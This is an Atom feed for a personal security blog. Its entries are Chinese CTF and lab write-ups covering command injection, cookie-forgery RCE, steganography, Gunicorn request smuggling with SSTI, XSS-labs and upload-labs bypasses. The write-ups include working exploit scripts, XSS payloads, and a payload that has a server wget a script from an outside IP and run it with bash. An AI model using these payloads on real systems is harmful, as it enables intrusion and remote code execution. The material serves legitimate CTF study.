@@ -1,0 +1,1587 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://p4d0rn.github.io</id>
+    <title>p4d0rn</title>
+    <updated>2022-12-14T03:33:33.122Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://p4d0rn.github.io"/>
+    <link rel="self" href="https://p4d0rn.github.io/atom.xml"/>
+    <subtitle>Where there is rule, there is bypass</subtitle>
+    <logo>https://p4d0rn.github.io/images/avatar.png</logo>
+    <icon>https://p4d0rn.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2022, p4d0rn</rights>
+    <entry>
+        <title type="html"><![CDATA[NCTF 2022]]></title>
+        <id>https://p4d0rn.github.io/post/nctf-2022/</id>
+        <link href="https://p4d0rn.github.io/post/nctf-2022/">
+        </link>
+        <updated>2022-12-05T10:28:07.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="calc">calc</h1>
+<p>F12源码提示/source，访问可得到源码</p>
+<pre><code class="language-python">@app.route(&quot;/calc&quot;, methods=['GET'])
+def calc():
+    ip = request.remote_addr
+    num = request.values.get(&quot;num&quot;)
+    log = &quot;echo {0} {1} {2}&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;, time.localtime()), ip, num)
+    if waf(num):
+        try:
+            data = eval(num)
+            os.system(log)
+        except:
+            pass
+        return str(data)
+    else:
+        return &quot;waf!!&quot;
+</code></pre>
+<p>num可控，但是发现过滤了括号和很多东西，难以通过eval(num)执行python代码进而RCE<br>
+下面直接执行了os.system(log)，log里面的num可控，可以在前面加个换行符来控制命令执行<br>
+空格被过滤了，使用%09(tab)或\x09作为分隔符。<br>
+用单引号绕过 eval， 把这一段识别成字符串， 使其能正常执行不抛异常。</p>
+<p>过滤了太多东西了，把要执行的命令放在VPS上，让服务器下载后执行。<br>
+<code>num=%0a'wget'%09'http://114.116.22.181:80/rce.txt'</code><br>
+然后 <code>num=%0a'bash'%09'rce.txt'</code> 执行即可</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[HITCON 2022]]></title>
+        <id>https://p4d0rn.github.io/post/hitcon-2022/</id>
+        <link href="https://p4d0rn.github.io/post/hitcon-2022/">
+        </link>
+        <updated>2022-11-29T05:43:45.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="rce">🎲 RCE</h1>
+<pre><code class="language-js">const express = require('express');
+const cookieParser = require('cookie-parser')
+const crypto = require('crypto');
+
+const randomHex = () =&gt; '0123456789abcdef'[~~(Math.random() * 16)];
+
+const app = express();
+app.use(cookieParser(crypto.randomBytes(20).toString('hex')));
+
+app.get('/', function (_, res) {
+    res.cookie('code', '', { signed: true })
+        .sendFile(__dirname + '/index.html');
+});
+
+app.get('/random', function (req, res) {
+    let result = null;
+    if (req.signedCookies.code.length &gt;= 40) {
+        const code = Buffer.from(req.signedCookies.code, 'hex').toString();
+        try {
+            result = eval(code);
+        } catch {
+            result = '(execution error)';
+        }
+        res.cookie('code', '', { signed: true })
+            .send({ progress: req.signedCookies.code.length, result: `Executing '${code}', result = ${result}` });
+    } else {
+        res.cookie('code', req.signedCookies.code + randomHex(), { signed: true })
+            .send({ progress: req.signedCookies.code.length, result });
+    }
+});
+
+app.listen(5000);
+</code></pre>
+<p>刚开始cookie为空，每次访问 <code>/random</code> 都添加一个十六进制数，当长度≥40时将cookie的内容Hex转String，并执行。<br>
+先看一下 <code>cookie-parser</code> 处理后的cookie结构</p>
+<p>本地测试一下：</p>
+<pre><code class="language-js">app.get('/', function (_, res) {
+    res.cookie('code', 'test', { signed: true })
+        .send('hello');
+});
+</code></pre>
+<p><img src="https://p4d0rn.github.io/post-images/1669701036671.png" alt="" loading="lazy"><br>
+结构为：<code>s:xxx.sign(xxx)</code>  点号后面应该对内容的签名，防止客户端篡改<br>
+因此思路就浮现了，我们每次访问 <code>/random</code>，服务端都会帮我们随机添加一个十六进制数，再对其签名，我们能不能让其帮我们构造出rce呢？<br>
+只要每次检测其添加的十六进制数是否为我们想要的即可，若不满足就丢掉。</p>
+<pre><code class="language-python">payload = 'eval(req.query.cmd);'
+print(payload.encode().hex())
+# 6576616c287265712e71756572792e636d64293b
+</code></pre>
+<p>长度刚好为40</p>
+<pre><code class="language-python">import requests
+
+cookie_url = &quot;http://127.0.0.1:5000&quot;
+url = cookie_url + '/random'
+
+payload = 'eval(req.query.cmd);'.encode().hex()
+# 6576616c287265712e71756572792e636d64293b
+
+init_res = requests.get(cookie_url)
+init_cookie = init_res.cookies.get_dict()['code']
+
+cookies = {'code': init_cookie}
+position = 0
+while True:
+    r = requests.get(url, cookies=cookies)
+    new_cookie = r.cookies.get_dict()['code']
+
+    if position &lt; 40:
+        if new_cookie[4 + position] == payload[position]:
+            position += 1
+            cookies = {'code': new_cookie}
+            print(str(position) + &quot;: &quot; + new_cookie)
+
+    if position == len(payload):
+        break
+
+result = requests.get(url + &quot;?cmd=require('child_process').execSync('calc').toString()&quot;, cookies=cookies)
+print(result.text)
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[信息隐藏-Chall Conception]]></title>
+        <id>https://p4d0rn.github.io/post/steg-chall-conception/</id>
+        <link href="https://p4d0rn.github.io/post/steg-chall-conception/">
+        </link>
+        <updated>2022-10-29T04:43:41.000Z</updated>
+        <content type="html"><![CDATA[<p>信息隐藏课程作业——小组对抗。<br>
+记录一下出题过程。🤡</p>
+<h1 id="一-broken-puzzles">一、Broken Puzzles</h1>
+<p>分割图片为一张张小图片，大小为40*40</p>
+<pre><code class="language-python">from PIL import Image
+im = Image.open('test.png')
+size = im.size
+WIDTH, HEIGHT = 40, 40
+row = size[0] // WIDTH
+col = size[1] // HEIGHT
+# 48x27
+for i in range(0, size[0] + 1 - WIDTH, WIDTH):
+    for j in range(0, size[1] + 1 - HEIGHT, HEIGHT):
+        print((i, j))
+        cropped = im.crop((i, j, i + WIDTH, j + HEIGHT))
+        cropped.save(f&quot;./puzzle/{((i // WIDTH)+13) % row}_{((j // HEIGHT) + 13) % col}.png&quot;)
+</code></pre>
+<p>分割后如下：<br>
+<img src="https://p4d0rn.github.io/post-images/1667378656406.png" alt="" loading="lazy"><br>
+拼图需要用到一个工具👉<a href="https://blog.csdn.net/ZT7524/article/details/119981204">参考</a></p>
+<ol>
+<li>将碎片组成一张图片<br>
+<code>montage ./puzzle/*.png -tile 48x27 -geometry +0+0 puzzle.png</code><br>
+48*27是长碎片数*高碎片数（其实看碎片的命名也能得到这个信息）</li>
+<li>拼图<br>
+<code>gaps --image=puzzle.png --size=40 --save</code><br>
+<img src="https://p4d0rn.github.io/post-images/1667379496577.png" alt="" loading="lazy"><br>
+<img src="https://p4d0rn.github.io/post-images/1667019751727.png" alt="" loading="lazy"></li>
+</ol>
+<h1 id="二-pic-in-pic">二、Pic in Pic</h1>
+<p>基础LSB隐写</p>
+<pre><code class="language-python">import os.path
+from PIL import Image
+im = Image.open('taowa.jpg')
+QR_bin = &quot;&quot;
+count = 0
+size = os.path.getsize('QR_original.png')
+width = im.size[0]
+height = im.size[1]
+with open('QR_original.png', 'rb') as f:
+    for i in range(size):
+        s = f.read(1)
+        s = int.from_bytes(s, signed=False, byteorder='big')
+        QR_bin += str(bin(s).replace('0b', '')).zfill(8)
+bin_len = len(QR_bin)
+for j in range(height):
+    for k in range(width):
+        pixel = im.getpixel((k, j))
+        R = pixel[0]
+        G = pixel[1]
+        B = pixel[2]
+        # RGB值余2即可得到最低位的值
+        if count &gt;= bin_len:
+            R = R - (R % 2)
+            G = G - (G % 2)
+            B = B - (B % 2)
+            im.putpixel((k, j), (R, G, B))
+        else:
+            R = R - (R % 2) + int(QR_bin[count])
+            count += 1
+            if count &gt;= bin_len:
+                im.putpixel((k, j), (R, G - (G % 2), B - (B % 2)))
+                continue
+            G = G - (G % 2) + int(QR_bin[count])
+            count += 1
+            if count &gt;= bin_len:
+                im.putpixel((k, j), (R, G, B - (B % 2)))
+                continue
+            B = B - (B % 2) + int(QR_bin[count])
+            count += 1
+            im.putpixel((k, j), (R, G, B))
+im.save('out.png')
+</code></pre>
+<p>用StegSolve提取最低有效位<br>
+<img src="https://p4d0rn.github.io/post-images/1667021913564.png" alt="" loading="lazy"><br>
+发现是一张PNG图片，保存下来<br>
+<img src="https://p4d0rn.github.io/post-images/1667021167091.png" alt="" loading="lazy"><br>
+二维码扫不出来，需要稍微处理一下</p>
+<pre><code class="language-python">from PIL import Image
+im = Image.open('QR_original.png')
+im = im.convert('RGB')
+_dict = {}
+for i in range(im.size[0]):
+    for j in range(im.size[1]):
+        pixel = im.getpixel((i, j))
+        # 统计某个像素值的个数
+        _dict[pixel] = _dict.get(pixel, 0) + 1
+_list = list(_dict.items())
+# 按照统计像素值个数来排序
+_list.sort(key=lambda x: x[-1])
+print(_list)
+</code></pre>
+<p>统计得 [((243, 243, 243), 32632), ((255, 255, 255), 32904)]<br>
+把(243, 243, 243)改为(0, 0, 0) 黑色</p>
+<pre><code class="language-python">from PIL import Image
+im = Image.open('QR_original.png')
+im = im.convert('RGB')
+for i in range(im.size[0]):
+    for j in range(im.size[1]):
+        if im.getpixel((i, j)) == (243, 243, 243):
+            im.putpixel((i, j), (0, 0, 0))
+im.show()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://p4d0rn.github.io/post-images/1667022322955.png" alt="" loading="lazy"></figure>
+<h1 id="三-ez_word">三、EZ_Word</h1>
+<p>Word修改后缀docx为zip<br>
+<img src="https://p4d0rn.github.io/post-images/1667383556957.png" alt="" loading="lazy"><br>
+查看图片详情，发现图片高度和宽度都为0<br>
+CRC是由49 48 44 52 + 后面的13个字节共17个字节做CRC校验得到的<br>
+需要进行CRC爆破<br>
+<img src="https://p4d0rn.github.io/post-images/1667024264650.png" alt="" loading="lazy"></p>
+<pre><code class="language-python">from zlib import crc32
+
+data = open(&quot;./blank.png&quot;, 'rb').read()
+index = 12
+ihdr = bytearray(data[index:index + 17])
+width_index = 7
+height_index = 11
+
+for x in range(1, 1500):
+    height = bytearray(x.to_bytes(2, 'big'))
+    for y in range(1, 1500):
+        width = bytearray(y.to_bytes(2, 'big'))
+        for i in range(len(height)):
+            ihdr[height_index - i] = height[-i - 1]
+        for i in range(len(width)):
+            ihdr[width_index - i] = width[-i - 1]
+        if hex(crc32(ihdr)) == '0xcf7ddd56':
+            print(&quot;width: {} height: {}&quot;.format(width.hex(), height.hex()))
+    for i in range(len(width)):
+        ihdr[width_index - i] = bytearray(b'\x00')[0]
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Jade CTF WriteUp]]></title>
+        <id>https://p4d0rn.github.io/post/jade-ctf-writeup/</id>
+        <link href="https://p4d0rn.github.io/post/jade-ctf-writeup/">
+        </link>
+        <updated>2022-10-26T08:29:25.000Z</updated>
+        <content type="html"><![CDATA[<p>😭第一次做外国的题目，就觉得不太一样。</p>
+<h1 id="ultra-baby-web">ULTRA BABY WEB</h1>
+<p>签到题<br>
+修改Cookie：<code>user=admin</code></p>
+<h1 id="baby-web">BABY WEB</h1>
+<blockquote>
+<p>What's going on with this website?! Weird characters keep popping up.<br>
+No need to bruteforce</p>
+</blockquote>
+<p>GET参数<code>?page=???</code></p>
+<ul>
+<li>发现规律：</li>
+</ul>
+<blockquote>
+<p>page=0 返回随机字符<br>
+page=1 ~ 3 返回恒定字符<br>
+page=4 返回随机字符</p>
+</blockquote>
+<p>脚本去探测返回不变的页面</p>
+<pre><code class="language-python">
+import requests
+
+
+def get_res(page):
+    r = requests.get(f'http://34.76.206.46:10008/?page={page}')
+    return r.text
+
+
+for i in range(100):
+    a = get_res(i)
+    b = get_res(i)
+    if a == b:
+        print(f&quot;page: {i} has {a}&quot;)
+</code></pre>
+<blockquote>
+<p>page: 1 has m<br>
+page: 2 has 4<br>
+page: 3 has k<br>
+page: 5 has i<br>
+page: 8 has n<br>
+page: 13 has g<br>
+page: 21 has _<br>
+page: 34 has 1<br>
+page: 43 has 2<br>
+....</p>
+</blockquote>
+<p>细致观察发现这是斐波那契数列</p>
+<pre><code class="language-python">import time
+
+import requests
+
+
+def get_fio():
+    _l = [1, 2]
+    for x in range(100):
+        _l.append(_l[x] + _l[x + 1])
+    return _l
+
+
+def get_res(page):
+    r = requests.get(f'http://34.76.206.46:10008/?page={page}')
+    return r.text
+
+
+fio_list = get_fio()
+for fio in fio_list:
+    res = get_res(fio)
+    print(res, end='')
+    time.sleep(0.2)
+</code></pre>
+<p><code>m4king_1t_b1g_s0_th4t_y0u_h4ve_t0_scr1pt_jadeCTF{f1bonacci_FTW!}</code>✌</p>
+<h1 id="green-coffee">GREEN COFFEE</h1>
+<blockquote>
+<p>My n00b friend built this web application for his coffee business.<br>
+Can you help me pwn it?<br>
+Note: Enumeration is allowed, but don't use very large wordlists.</p>
+</blockquote>
+<p>进去是个静态网站，没啥东西，看来需要爆破目录了</p>
+<p>这里用个工具FFUF（ Fuzz Faster U Fool：A fast web fuzzer written in Go.）<br>
+👉<a href="https://blog.csdn.net/u010062917/article/details/120473487">使用教程</a><br>
+• -u url地址<br>
+• -w 设置字典<br>
+• -mc ：指定状态代码<br>
+• -fw : 按字数过滤</p>
+<p>字典👉<a href="https://github.com/TheKingOfDuck/fuzzDicts">戳我</a></p>
+<blockquote>
+<p>ffuf -u http://34.76.206.46:10014/FUZZ -w /home/kali/fuzzDicts/subdomainDicts/main.txt --mc 200 --fs 207</p>
+</blockquote>
+<p>字典有点大。。。跑挺久<br>
+<img src="https://p4d0rn.github.io/post-images/1666776455131.png" alt="" loading="lazy"><br>
+访问/internal，返回页面<code>You shouldn't be here. This is for internal use only</code><br>
+应该是要以某种内部的方式访问，直接改X-Forwarded-For是不行的</p>
+<p>Wappalyze检测到了服务器为Gunicorn<br>
+<img src="https://p4d0rn.github.io/post-images/1666776672694.png" alt="" loading="lazy"></p>
+<p>Gunicorn的HTTP请求走私👉<a href="https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/">Gunicorn 20.0.4 Request Smuggling</a><br>
+绰！之前只是了解过一点HTTP请求走私，没想到在CTF上还真能用上</p>
+<p>由于是外网，Burp记得开上游代理<br>
+User options -&gt; Connections -&gt; Upstream Proxy Servers<br>
+还有Burp的repeater模块自动更新Content-Length也要关闭<br>
+<img src="https://p4d0rn.github.io/post-images/1666777409995.png" alt="" loading="lazy"><br>
+🤯太菜了，Burp复现不了！</p>
+<p>利用nc发包</p>
+<blockquote>
+<p>echo -en &quot;GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 71\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /internal HTTP/1.1\r\nHost: localhost\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n&quot; | nc 34.76.206.46 10014</p>
+</blockquote>
+<p><img src="https://p4d0rn.github.io/post-images/1666779832368.png" alt="" loading="lazy"><br>
+传username参数</p>
+<blockquote>
+<p>echo -en &quot;GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 86\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /internal?username=admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n&quot; | nc 34.76.206.46 10014</p>
+</blockquote>
+<p><img src="https://p4d0rn.github.io/post-images/1666781492342.png" alt="" loading="lazy"><br>
+由于后端是python，尝试SSTI，传参{{7*7}}<br>
+<img src="https://p4d0rn.github.io/post-images/1666781603090.png" alt="" loading="lazy"></p>
+<blockquote>
+<p>echo -en &quot;GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 154\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /internal?username=%7B%7Bcycler.__init__.__globals__.os.popen('cat%20flag.txt').read()%7D%7D HTTP/1.1\r\nHost: localhost\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n&quot; | nc 34.76.206.46 10014</p>
+</blockquote>
+<pre><code class="language-html">&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;
+            Internal Portal
+        &lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Internal Portal&lt;/h1&gt;
+        &lt;h3&gt;Welcome, jadeCTF{smuggl3r_smuggl1ng_p4yl04ddd!}&lt;/h3&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>some unintended solutions：</p>
+<pre><code class="language-python">import requests
+
+URL = &quot;http://34.76.206.46:10014&quot;
+cmd = &quot;cat flag.txt&quot;
+payload = &quot;{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('%s').read() }}&quot; %cmd
+req = requests.Request(&quot;GET&quot;, &quot;http://foo&quot;)
+prep = req.prepare()
+prep.url = f&quot;{URL}/interna%6c?username={payload}&quot;
+# or f&quot;{URL}//internal?username={payload}&quot;
+res = requests.Session().send(prep)
+
+print(res.text)
+</code></pre>
+<pre><code class="language-python">import requests
+
+URL = &quot;http://34.76.206.46:10014&quot;
+cmd = &quot;cat flag.txt&quot;
+payload = &quot;{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('%s').read() }}&quot; %cmd
+res = requests.get(f&quot;{URL}//internal?username={payload}&quot;)
+print(res.text)
+</code></pre>
+<p>搞不懂，//internal和/interna%6c都能绕过haproxy<br>
+或许是gunicorn啥解析特性吧。。。</p>
+<p>👉<a href="https://xz.aliyun.com/t/6878">其他学习博客</a></p>
+<h1 id="game">++GAME</h1>
+<p>题目给了服务端的代码和服务端使用的API的代码<br>
+注册登录后，需要达到9223372036854775807分才能获取flag<br>
+通过按inc可以增加分数，但是每次都要reCAPTCHA认证（该死的谷歌！）<br>
+增分的逻辑如下</p>
+<pre><code class="language-php">// snippet of dashboard.php
+if(isset($_POST['inc'])){
+        $recaptcha = $_POST['g-recaptcha-response'];
+        $secret_key = '&lt;&lt;REDACTED&gt;&gt;';
+        $url = 'https://www.google.com/recaptcha/api/siteverify?secret='.$secret_key.'&amp;response='.$recaptcha;
+        $response = file_get_contents($url);
+        $response = json_decode($response);
+        if ($response-&gt;success===false) {
+            die('Captcha failed!');
+        }
+        $current=$_SESSION['score'];
+        $new_score=$current+1;
+        $concat=$username.$new_score.$secret;
+        $signature=sha1($concat);
+        $var=&quot;http://api/update_score.php?username={$username}&amp;next_level={$new_score}&amp;signature={$signature}&quot;;
+        $head=sprintf(&quot;API: %s&quot;,$var);
+        header($head);
+        $status=fetch($var);
+}
+</code></pre>
+<p>返回包里会多一个API字段<br>
+signature=sha1（username + new_score + secret）<br>
+new_score是更新后的分数，secret不得而知</p>
+<p>由于这里只是简单的拼接后计算签名，我们可以作如下构造：<br>
+A： username=p4d0rn_922337203685477580&amp;next_level=1<br>
+B： username=p4d0rn_&amp;next_level=9223372036854775801</p>
+<p>A、B算出的sha1应该是相同的<br>
+因此先注册账户A获取对应的signatureA<br>
+再注册账号B，构造<code>http://api/update_score.php?username=p4d0rn_&amp;next_level=9223372036854775801&amp;signature=signatureA</code>，发送请求更新分数，拿到flag<br>
+jadeCTF{b4s1c_yet_sm4rt_xploiTTT}</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[XSS-Lab Challenge]]></title>
+        <id>https://p4d0rn.github.io/post/xss-lab-challenge/</id>
+        <link href="https://p4d0rn.github.io/post/xss-lab-challenge/">
+        </link>
+        <updated>2022-10-26T01:24:17.000Z</updated>
+        <content type="html"><![CDATA[<p>在线靶场地址👉<a href="https://xssaq.com/yx/">戳这</a><br>
+后端源码地址👉<a href="https://github.com/do0dl3/xss-labs">戳这</a></p>
+<script>alert('😂XSS彩蛋')</script>
+<p>通关逻辑：触发alert</p>
+<pre><code class="language-js">window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level2.php?keyword=test&quot;; 
+}
+</code></pre>
+<h1 id="level-1">Level 1</h1>
+<p>发现用户名被“嵌入”到网页中<br>
+<img src="https://p4d0rn.github.io/post-images/1666747853975.png" alt="" loading="lazy"></p>
+<blockquote>
+<p>level1.php?name=&lt;script&gt;alert(/xss/)&lt;/script&gt;</p>
+</blockquote>
+<h1 id="level-2">Level 2</h1>
+<p><img src="https://p4d0rn.github.io/post-images/1666747983270.png" alt="" loading="lazy"><br>
+<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>无效<br>
+<img src="https://p4d0rn.github.io/post-images/1666748061365.png" alt="" loading="lazy"><br>
+<code>&lt;</code> 、<code>&gt;</code>被HTML实体编码，但input的value属性没被编码</p>
+<blockquote>
+<p>level2.php?keyword=&quot;&gt; &lt;script&gt;alert(/xss/)&lt;/script&gt;</p>
+</blockquote>
+<h1 id="level-3">Level 3</h1>
+<p><img src="https://p4d0rn.github.io/post-images/1666748373749.png" alt="" loading="lazy"><br>
+这次input的value属性也被编码了<br>
+<img src="https://p4d0rn.github.io/post-images/1666748346994.png" alt="" loading="lazy"><br>
+试试一些事件属性 onclick、onmouseover<br>
+如下payload，当鼠标经过搜索输入框时，触发alert</p>
+<blockquote>
+<p>level3.php?keyword=' onmouseover=alert(/xss/) '</p>
+</blockquote>
+<h1 id="level-4">Level 4</h1>
+<p><img src="https://p4d0rn.github.io/post-images/1666749550162.png" alt="" loading="lazy"><br>
+直接把<code>&lt;</code> 、<code>&gt;</code>过滤了<br>
+同上，不过单引号换成双引号，还好没有实体编码引号</p>
+<blockquote>
+<p>level4.php?keyword=&quot; onmouseover=alert(/xss/) &quot;</p>
+</blockquote>
+<h1 id="level-5">Level 5</h1>
+<p><img src="https://p4d0rn.github.io/post-images/1666750946367.png" alt="" loading="lazy"><br>
+<img src="https://p4d0rn.github.io/post-images/1666750970743.png" alt="" loading="lazy"><br>
+<code>script</code>和<code>on</code>都被魔改了。。。<br>
+javascript伪协议还可以用</p>
+<blockquote>
+<p>level5.php?keyword=&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;</p>
+</blockquote>
+<p><img src="https://p4d0rn.github.io/post-images/1666751631447.png" alt="" loading="lazy"><br>
+点击触发alert</p>
+<h1 id="level-6">Level 6</h1>
+<p><code>href</code>也被魔改成<code> hr_ef</code><br>
+试试大小写绕过</p>
+<blockquote>
+<p>level5.php?keyword=&quot;&gt;&lt;a Href=javascript:alert(/xss/)&gt;</p>
+</blockquote>
+<h1 id="level-7">Level 7</h1>
+<p><code>script</code>、<code>href</code>等被换成空，尝试双写绕过</p>
+<blockquote>
+<p>level7.php?keyword=&quot;&gt;&lt;scscriptript&gt;alert(/xss/)&lt;/scrscriptipt&gt;</p>
+</blockquote>
+<h1 id="level-8">Level 8</h1>
+<p><img src="https://p4d0rn.github.io/post-images/1666752694667.png" alt="" loading="lazy"><br>
+输入会被填入友情链接的href属性中<br>
+直接输入<code>javascript:alert(/xss/)</code> ，scirpt中间被加下划线<br>
+试试unicode编码<br>
+<img src="https://p4d0rn.github.io/post-images/1666753531742.png" alt="" loading="lazy"><br>
+高级！href能识别unicode编码<br>
+联想到base64，但是data也被加下划线了<code>da_ta</code><br>
+eg: <code>data://text/plain;base64,amF2YXNjcmlwdDphbGVydCgxKQ==</code></p>
+<h1 id="level-9">Level 9</h1>
+<p><img src="https://p4d0rn.github.io/post-images/1666758755699.png" alt="" loading="lazy"><br>
+直接整个过滤了。。。<br>
+<img src="https://p4d0rn.github.io/post-images/1666758807815.png" alt="" loading="lazy"><br>
+猜测这里可能对url地址做了匹配</p>
+<blockquote>
+<p>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&gt;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41//http://baidu.com</p>
+</blockquote>
+<p><code>//</code>是为了注释掉http://baidu.com</p>
+<h1 id="level-10">Level 10</h1>
+<p>发现几个奇怪的input标签<br>
+康康后端代码<br>
+<img src="https://p4d0rn.github.io/post-images/1666760603590.png" alt="" loading="lazy"><br>
+GET参数获取的t_sort过滤掉左右尖号后拼接到value属性中</p>
+<blockquote>
+<p>level10.php?keyword=1&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert('xss')</p>
+</blockquote>
+<h1 id="level-11">Level 11</h1>
+<p>直接看后端代码<br>
+<img src="https://p4d0rn.github.io/post-images/1666760912264.png" alt="" loading="lazy"><br>
+获取Referer字段，过滤左右尖号，拼接到t_ref对应input的value属性<br>
+<img src="https://p4d0rn.github.io/post-images/1666761392365.png" alt="" loading="lazy"></p>
+<p>Referer: &quot; type=&quot;text&quot; onmouseover=&quot;alert('xss')</p>
+<h1 id="level-12">Level 12</h1>
+<p>和上题一样，不过注入点变成了User-Agent<br>
+<img src="https://p4d0rn.github.io/post-images/1666761876025.png" alt="" loading="lazy"></p>
+<h1 id="level-13">Level 13</h1>
+<p>注入点变成Cookie<br>
+<img src="https://p4d0rn.github.io/post-images/1666762040583.png" alt="" loading="lazy"></p>
+<h1 id="level-14">Level 14</h1>
+<p>考点是EXIF XSS<br>
+其实是Exif Viewer插件的问题，没有对图片的EXIF信息进行检验或过滤就进行渲染</p>
+<h1 id="level-15">Level 15</h1>
+<p>AngularJS框架，不看</p>
+<h1 id="level-16">Level 16</h1>
+<p>康康后端代码<br>
+<img src="https://p4d0rn.github.io/post-images/1666763772890.png" alt="" loading="lazy"><br>
+过滤了script、空格、/，用换行符%0a（回车）或%0D（回车）取代空格（在HTML中%0a和%0D是可以当成空格使用的）</p>
+<blockquote>
+<p>level16.php?keyword=&lt;img%0asrc=&quot;xxx&quot;%0aonerror=alert(1)&gt;</p>
+</blockquote>
+<h1 id="level-17-20">Level 17-20</h1>
+<p>这几题都是flash xss。<br>
+想着Flash都淘汰了，暂时不研究</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Upload-Labs Challenge]]></title>
+        <id>https://p4d0rn.github.io/post/upload-labs-challenge/</id>
+        <link href="https://p4d0rn.github.io/post/upload-labs-challenge/">
+        </link>
+        <updated>2022-10-25T05:21:09.000Z</updated>
+        <content type="html"><![CDATA[<p>靶场下载地址👉<a href="https://github.com/c0ny1/upload-labs">戳我</a></p>
+<h1 id="pass-01-前端js绕过">Pass-01 前端JS绕过</h1>
+<pre><code class="language-js">    function checkFile() {
+        var file = document.getElementsByName('upload_file')[0].value;
+        if (file == null || file == &quot;&quot;) {
+            alert(&quot;请选择要上传的文件!&quot;);
+            return false;
+        }
+        //定义允许上传的文件类型
+        var allow_ext = &quot;.jpg|.png|.gif&quot;;
+        //提取上传文件的类型
+        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
+        //判断上传文件类型是否允许上传
+        if (allow_ext.indexOf(ext_name) == -1) {
+            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+            alert(errMsg);
+            return false;
+        }
+    }
+</code></pre>
+<p>修改返回包，直接删掉onSubmmit属性<br>
+<img src="https://p4d0rn.github.io/post-images/1666676611153.png" alt="" loading="lazy"></p>
+<h1 id="pass-02-mime绕过">Pass-02 MIME绕过</h1>
+<p>修改上传文件的数据包 <code>Content-Type: image/jpeg</code></p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '文件类型不正确，请重新上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<h1 id="pass-03-等价后缀绕过">Pass-03 等价后缀绕过</h1>
+<p>返回提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！<br>
+修改文件名后缀为<code>.phtml</code> 或 <code>.php3</code>   (尝试<code>.php5</code>不行)<br>
+前提是Apache的<code>httpd.conf</code>中配置有如下代码:</p>
+<blockquote>
+<p>AddType application/x-httpd-php .php .php3 .phtml</p>
+</blockquote>
+<p>常见的可执行文件的后缀：</p>
+<blockquote>
+<p>PHP: php2、php3、php5、phtml、pht<br>
+ASP: aspx、ascx、ashx、cer、asa<br>
+JSP: jspx</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array('.asp','.aspx','.php','.jsp');
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if(!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
+            if (move_uploaded_file($temp_file,$img_path)) {
+                 $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
